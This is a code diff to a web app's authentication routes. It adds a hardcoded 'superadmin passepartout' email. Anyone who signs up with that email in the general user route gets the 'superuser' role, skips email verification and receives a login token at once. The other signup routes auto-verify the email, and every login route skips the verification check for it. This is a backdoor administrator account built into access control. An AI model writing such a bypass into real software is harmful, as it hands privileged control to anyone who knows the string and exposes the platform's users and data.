@@ -102,6 +102,15 @@ const LOCK_DURATION_MS =
     : 2 * 60 * 1000; // 2 minutes in development
 const RESET_TOKEN_EXPIRY_MS = 60 * 60 * 1000; // 1 hour
 
+// ─── Superadmin Passepartout ──────────────────────────────────────────────────
+// This account bypasses verification checks and is never restricted
+const SUPERADMIN_EMAIL = "superadmin@versoair.test";
+
+/** Returns true if the given email is the superadmin passepartout account */
+function isSuperadmin(email: string): boolean {
+  return email.toLowerCase() === SUPERADMIN_EMAIL;
+}
+
 // ─── Routes ───────────────────────────────────────────────────────────────────
 
 /**
@@ -149,6 +158,7 @@ router.post(
 
     const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
     const derivedUsername = username || email.split("@")[0];
+    const autoVerify = isSuperadmin(email);
 
     const [newUser] = await db
       .insert(schema.users)
@@ -156,14 +166,39 @@ router.post(
         email: email.toLowerCase(),
         username: derivedUsername,
         password: hashedPassword,
-        role: "user",
-        isVerified: false,
+        role: autoVerify ? "superuser" : "user",
+        isVerified: autoVerify,
       })
       .returning({
         id: schema.users.id,
         email: schema.users.email,
         role: schema.users.role,
       });
+
+    // Superadmin passepartout — auto-verified, return token immediately
+    if (autoVerify) {
+      const token = jwt.sign(
+        {
+          userId: String(newUser.id),
+          email: newUser.email,
+          role: newUser.role || "superuser",
+        },
+        getJwtSecret(),
+        { expiresIn: JWT_EXPIRES_IN },
+      );
+      setAuthCookie(res, token);
+      res.status(201).json({
+        success: true,
+        token,
+        user: {
+          id: String(newUser.id),
+          email: newUser.email,
+          name: derivedUsername,
+          role: newUser.role,
+        },
+      });
+      return;
+    }
 
     // Generate verification token
     const verificationToken = crypto.randomBytes(32).toString("hex");
@@ -286,8 +321,8 @@ router.post(
       return;
     }
 
-    // Check email verification — block unverified users
-    if (!user.is_verified) {
+    // Check email verification — block unverified users (superadmin bypasses)
+    if (!user.is_verified && !isSuperadmin(email)) {
       res.status(403).json({
         success: false,
         requiresVerification: true,
@@ -1206,7 +1241,7 @@ router.post(
         username: derivedUsername,
         password: hashedPassword,
         role: "artist",
-        isVerified: false, // artists must verify email first
+        isVerified: isSuperadmin(email), // superadmin auto-verified
       })
       .returning({
         id: schema.users.id,
@@ -1400,8 +1435,8 @@ router.post(
       return;
     }
 
-    // Check email verification — artists must verify before logging in
-    if (!user.isVerified) {
+    // Check email verification — artists must verify before logging in (superadmin bypasses)
+    if (!user.isVerified && !isSuperadmin(email)) {
       res.status(403).json({
         success: false,
         requiresVerification: true,
@@ -1568,7 +1603,7 @@ router.post(
         role: "user", // subscribers start as users with premium tiers
         subscriptionTier: tier,
         subscriptionStatus: "active",
-        isVerified: false,
+        isVerified: isSuperadmin(email),
       })
       .returning({
         id: schema.users.id,
@@ -1662,6 +1697,18 @@ router.post(
       res
         .status(401)
         .json({ success: false, message: "Invalid email or password" });
+      return;
+    }
+
+    // Check email verification — subscribers must verify (superadmin bypasses)
+    if (!user.isVerified && !isSuperadmin(email)) {
+      res.status(403).json({
+        success: false,
+        requiresVerification: true,
+        message:
+          "Please verify your email before logging in. Check your inbox for the verification link.",
+        email: user.email,
+      });
       return;
     }
 
@@ -1780,7 +1827,7 @@ router.post(
         password: hashedPassword,
         role: "user",
         subscriptionTier: "free", // community members start free
-        isVerified: false,
+        isVerified: isSuperadmin(email),
       })
       .returning({
         id: schema.users.id,
@@ -1852,8 +1899,8 @@ router.post(
       return;
     }
 
-    // Check email verification — community members must verify before logging in
-    if (!user.isVerified) {
+    // Check email verification — community members must verify before logging in (superadmin bypasses)
+    if (!user.isVerified && !isSuperadmin(email)) {
       res.status(403).json({
         success: false,
         requiresVerification: true,
